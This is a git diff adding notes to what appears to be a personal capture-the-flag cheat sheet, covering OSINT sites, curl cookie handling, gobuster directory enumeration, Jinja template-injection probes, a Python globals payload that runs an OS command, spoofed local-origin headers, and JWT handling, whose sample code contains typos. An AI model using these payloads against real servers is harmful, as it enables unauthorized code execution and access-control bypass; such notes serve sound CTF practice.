@@ -70,6 +70,7 @@ with open("capture.pcap", "rb") as file:
     pcap = dpkt.pcap.Reader(file)
 ```	
 
+
 ## Stegano
 
 - Stegsnow: `apt install stegsnow`
@@ -153,6 +154,80 @@ Stack alignment:
 - https://github.com/Gallopsled/pwntools
 - p64(0x401146): write the correct byte string (for little endian). For big endian, use p64((0x401146, endian='big')
 - pwntools with gdb: https://halb.it/posts/pwntools-gdb/
+
+## OSINT tools
+
+- [dumpor.io](https://dumpor.io/) which provides a general overview of several social media accounts for a given login.
+- [Gmail OSINT tool](https://gmail-osint.activetk.jp/) 
+
+
+## Web challenges
+
+- Get a cookie file with `-c`. It's a plaintext cookie. To re-use it later, use `-b`:
+
+```
+curl -i -c /tmp/cte33216-auth.txt \
+  -d 'username=test317619&email=test317619@x.test&password=test123' \
+  -X POST \
+  http://URL
+```
+
+- Enumerating directories of a website: **gobuster**. Download a list, [example](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt)
+
+```
+gobuster dir \
+  -u URL 
+  -w /tmp/directory-list-2.3-medium.txt \
+  -c 'session=YOURCOOKIE' \
+  -b 404 \ # hide responses with 404
+  -t 30 # 30 threads
+```
+
+- Test typical Jinja injections like `{{7*7}}`. `--data-urlencode with encode special characters. `-sS` is for silent mode.
+
+```
+curl -sS -b /tmp/cte33216-auth.txt \
+  --data-urlencode 'username={{7*7}}' \
+  -X POST \
+  http://URL
+```
+
+- *Abuse* Python globals and imports: example: `self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()`
+
+- Making the server think you're local:
+
+```
+curl -s \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Real-IP: 127.0.0.1" \
+  -H "X-Forwarded-Host: localhost" \
+  -H "CF-Connecting-IP: 127.0.0.1" \
+  -b /tmp/vip_cookies.txt \
+  http://URL
+```
+
+**JWT** (JSON Web Token) consists in `header.payload.signature`. For example,
+
+- Header: `{ "alg": "HS256", "typ" : "JWT" }`
+- Payload: `{ "username" : "me", "is_admin" : "true"} `
+- Signature: `Base64( HMAC-SHA256(secret, HEADER.PAYLOAD) )`. Uses a JWT **secret**.
+
+In Python, use `import jwt`, then:
+
+```python
+token = jwt.encode( { "username" : "me", "is_admin" : "true"}, SECRET, algorithm="HS256")
+return jsonify(token=token)
+
+...
+
+try:
+   payload = jwt.decode( request.cookies.get("token") or request.headers["Authorization"].removeprefix("Bearer "), SECRET, algorithms=["HS256"})
+except (jew.InvalidTokenError, KeyError):
+   ...
+```
+
+
+
 
 ## Write-ups
 
